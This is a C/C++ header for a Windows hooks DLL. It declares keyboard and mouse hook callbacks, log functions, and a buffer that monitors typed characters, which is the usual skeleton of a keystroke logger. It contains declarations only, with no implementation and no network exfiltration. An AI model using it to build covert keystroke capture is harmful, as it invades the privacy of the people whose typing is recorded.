
#ifdef HOOKS_EXPORTS
#define HOOKS_API __declspec(dllexport)
#else
#define HOOKS_API __declspec(dllimport)
#endif


void HOOKS_API SetHooks(HHOOK hk, HHOOK hm, HHOOK hs, HWND wnd,char );
bool HOOKS_API isExit();
#ifdef HOOKS_EXPORTS
	void HOOKS_API AddLOG_message(char *message, int len, int add_time);	
#else
	void HOOKS_API AddLOG_message(char *message, int len, int add_time);	
#endif
LRESULT HOOKS_API CALLBACK KeyProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT HOOKS_API CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
void    HOOKS_API Get_CharactersMonitor_buffer(LPTSTR buffer1, int buffer_size);
void HOOKS_API Clear_CharactersMonitor_buffer();

void AddHist(char *letter, int len);
void CheckTimer();
void CheckTask();